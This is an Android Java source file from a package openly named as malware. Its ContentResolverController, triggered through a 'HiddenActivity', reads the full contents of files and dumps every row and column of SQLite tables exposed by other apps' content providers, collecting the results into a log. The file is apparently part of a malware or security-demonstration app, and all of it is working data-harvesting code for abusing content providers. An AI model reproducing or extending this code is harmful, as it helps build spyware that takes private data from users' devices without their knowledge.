package com.kira.malware.controllers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.text.TextUtils;

import androidx.annotation.NonNull;

import com.kira.malware.models.LogModel;

import java.io.FileInputStream;
import java.io.IOException;

public class ContentResolverController {

    private static final int BUFFER_SIZE = 2048;
    /**
     * Send this extra intent information to HiddenActivity to invoke the file content provider method (callback).
     */
    public static final String FILE_PROVIDER_KEY = "ContentResolverController", FILE_PROVIDER_VALUE = "fileProvider";
    /**
     * Send this extra intent information to HiddenActivity to invoke the SQLite content provider method (callback).
     */
    public static final String SQLITE_PROVIDER_KEY = "ContentResolverController", SQLITE_PROVIDER_VALUE = "sqliteProvider";

    /**
     * File content provider.
     */
    public static LogModel fileProvider(@NonNull Context context, @NonNull Uri uri) {
        LogModel status = new LogModel();
        try (ParcelFileDescriptor fileDescriptor = context.getContentResolver().openFileDescriptor(uri, "r")) {
            if (fileDescriptor == null) {
                status.setErrorMessage(String.format("Cannot query \"%s\" URI", uri));
            } else {
                try (FileInputStream fileStream = new FileInputStream(fileDescriptor.getFileDescriptor())) {
                    byte[] buffer = new byte[BUFFER_SIZE];
                    int bytes;
                    while ((bytes = fileStream.read(buffer)) > 0) {
                        status.appendMessage(new String(buffer, 0, bytes));
                    }
                    status.setSuccess(true);
                }
            }
        } catch (RuntimeException | IOException e) {
            status.setExceptionMessage(e.getMessage());
        }
        return status;
    }

    /**
     * SQLite content provider.
     */
    public static LogModel sqliteProvider(@NonNull Context context, @NonNull Uri uri) {
        LogModel status = new LogModel();
        try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
            if (cursor == null) {
                status.setErrorMessage(String.format("Cannot query \"%s\" URI", uri));
            } else {
                String[] columns = cursor.getColumnNames();
                String[] values = new String[columns.length];
                status.appendMessage(TextUtils.join("\t", columns));
                while (cursor.moveToNext()) {
                    for (int i = 0; i < values.length; i++) {
                        int index = cursor.getColumnIndex(columns[i]);
                        values[i] = cursor.getString(index);
                    }
                    status.appendMessage(String.format("%s", TextUtils.join("\t", values)));
                }
                status.setSuccess(true);
            }
        } catch (RuntimeException e) {
            status.setExceptionMessage(e.toString());
        }
        return status;
    }

}